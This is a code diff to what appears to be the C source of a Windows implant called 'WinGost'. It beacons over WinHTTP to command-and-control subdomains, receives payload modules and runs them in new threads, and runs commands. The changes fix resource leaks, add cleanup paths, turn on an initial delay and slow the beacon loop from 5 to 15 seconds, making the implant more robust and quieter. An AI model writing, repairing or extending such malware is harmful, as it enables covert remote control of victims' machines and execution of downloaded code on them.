@@ -116,6 +116,7 @@ uint64_t generate_unique_id(PFUNCTION_TABLE ft){
     uint64_t unique_id = ((uint64_t)lpSystemTimeAsFileTime->dwHighDateTime << 32) | lpSystemTimeAsFileTime->dwLowDateTime;
     ConvertUint64ToHex(unique_id, ft->userID);
 
+    return 0;
 }
 
 uint32_t hash_module_name_wide(const wchar_t *name) {
@@ -282,6 +283,7 @@ void handleModuleExecution(PFUNCTION_TABLE ft, void* payload, DWORD totalSize) {
     HANDLE hThread = ft->Kernel32.CreateThread(NULL, 1024 * 1024, ModuleThread, params, 0, NULL);
     if (hThread == NULL) {
         ft->Kernel32.VirtualFree(writeableMemory, 0, MEM_RELEASE);
+        ft->Ntdll.RtlFreeHeap(ft->Kernel32.GetProcessHeap(), 0, params);
         return;
     }
 
@@ -297,7 +299,10 @@ BOOL c2BeaconCommunicate(wchar_t* domain, PFUNCTION_TABLE ft){
     HINTERNET hConnect = ft->WinHttp.WinHttpConnect(hSession, domain, 80, 0);
     HINTERNET hRequest = ft->WinHttp.WinHttpOpenRequest(hConnect, L"GET", L"/?beacon=ALIVE", NULL, NULL, NULL, 0);
 
-    if (!hSession || !hConnect || !hRequest) {return FALSE;}
+
+    if (!hSession || !hConnect || !hRequest) {
+        goto cleanup;
+    }
 
     WCHAR cookie[64];  // enough for "Cookie: " + 8 chars + CRLF + null
     WCHAR *p = cookie;
@@ -313,10 +318,10 @@ BOOL c2BeaconCommunicate(wchar_t* domain, PFUNCTION_TABLE ft){
     // Step 4: null terminate
     *p = L'\0';
 
-    if (!ft->WinHttp.WinHttpAddRequestHeaders(hRequest, cookie, (ULONG)-1L, WINHTTP_ADDREQ_FLAG_ADD)) {return FALSE;}
+    if (!ft->WinHttp.WinHttpAddRequestHeaders(hRequest, cookie, (ULONG)-1L, WINHTTP_ADDREQ_FLAG_ADD)) {goto cleanup;}
 
     //if (!ft->WinHttp.WinHttpAddRequestHeaders(hRequest, L"\r\n", (ULONG)-1L, WINHTTP_ADDREQ_FLAG_ADD)) {return FALSE;}
-    if (!ft->WinHttp.WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0)) {return FALSE;}
+    if (!ft->WinHttp.WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0)) {goto cleanup;}
     ft->WinHttp.WinHttpReceiveResponse(hRequest, NULL);
 
     BYTE buffer[4096];  // Fixed buffer
@@ -359,12 +364,20 @@ BOOL c2BeaconCommunicate(wchar_t* domain, PFUNCTION_TABLE ft){
         }
     }
 
-    if(!found){return TRUE;}
+    if(!found){
+        return TRUE;
+    }
 
     // handle module execution
     handleModuleExecution(ft, buffer_ptr, totalBytesRead - (DWORD)(buffer_ptr - buffer));
 
     return TRUE;
+
+    cleanup:
+        if (hRequest) ft->WinHttp.WinHttpCloseHandle(hRequest);
+        if (hConnect) ft->WinHttp.WinHttpCloseHandle(hConnect);
+        if (hSession) ft->WinHttp.WinHttpCloseHandle(hSession);
+        return FALSE;
 }
 
 // WinGost API List
@@ -502,7 +515,7 @@ BOOL gostExecute(char* command, char* output, DWORD* outputSize, PFUNCTION_TABLE
 
 __declspec(dllexport) void __main(void) {
 
-    //derectSleep(FALSE,300);
+    derectSleep(FALSE,300);
 
 
     // Initialize function table
@@ -577,7 +590,7 @@ __declspec(dllexport) void __main(void) {
     while (1)
     {
         
-        derectSleep(FALSE, 5); // Sleep for 5 seconds before next beacon
+        derectSleep(FALSE, 15); // Sleep for 5 seconds before next beacon
 
         if(c2BeaconCommunicate(subdomains[i], ft)){
             ft->domain = subdomains[i];
